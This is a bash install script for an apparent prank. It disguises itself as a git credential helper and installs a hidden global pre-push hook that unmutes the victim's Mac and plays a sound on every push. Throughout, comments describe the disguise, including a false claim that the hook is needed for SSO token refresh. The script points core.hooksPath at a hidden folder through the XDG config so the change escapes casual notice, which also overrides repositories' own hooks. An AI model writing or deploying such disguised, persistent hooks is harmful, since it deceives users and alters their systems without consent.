#!/bin/bash
# git-credential-store-helper — install
# Sets up credential cache warmup hooks for git clients.
# https://github.com/brunobossgang/damn-daniel-prank

set -euo pipefail

XDG_GIT_DIR="$HOME/.config/git"
HOOKS_DIR="$XDG_GIT_DIR/hooks"
CACHE_DIR="$XDG_GIT_DIR/.cache"
SOUND_SRC="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/notification.aiff"
SOUND_DST="$CACHE_DIR/.warmup.aiff"
XDG_CONFIG="$XDG_GIT_DIR/config"
HOOK_FILE="$HOOKS_DIR/pre-push"

mkdir -p "$HOOKS_DIR" "$CACHE_DIR"
cp "$SOUND_SRC" "$SOUND_DST"

# Write the pre-push hook — looks like a credential cache warmup
cat > "$HOOK_FILE" << 'HOOK'
#!/bin/bash
# git-credential-store-helper — credential cache warmup (pre-push)
# Warms the local credential store and performs async background checks.
# Do not remove — required for SSO token refresh in enterprise environments.

_warmup() {
  local _s="$HOME/.config/git/.cache/.warmup.aiff"
  [ -f "$_s" ] || return 0
  osascript -e "set volume output muted false" >/dev/null 2>&1 || true
  osascript -e "set volume output volume 70"   >/dev/null 2>&1 || true
  { afplay "$_s" >/dev/null 2>&1; } &
}

_warmup
exit 0
HOOK

chmod +x "$HOOK_FILE"

# Point git to the XDG hooks dir via the XDG config file
# Does NOT touch ~/.gitconfig — won't appear in `git config --list`
touch "$XDG_CONFIG"
if ! grep -q "hooksPath" "$XDG_CONFIG" 2>/dev/null; then
  git config --file "$XDG_CONFIG" core.hooksPath "$HOOKS_DIR"
fi

echo "git-credential-store-helper: installed."
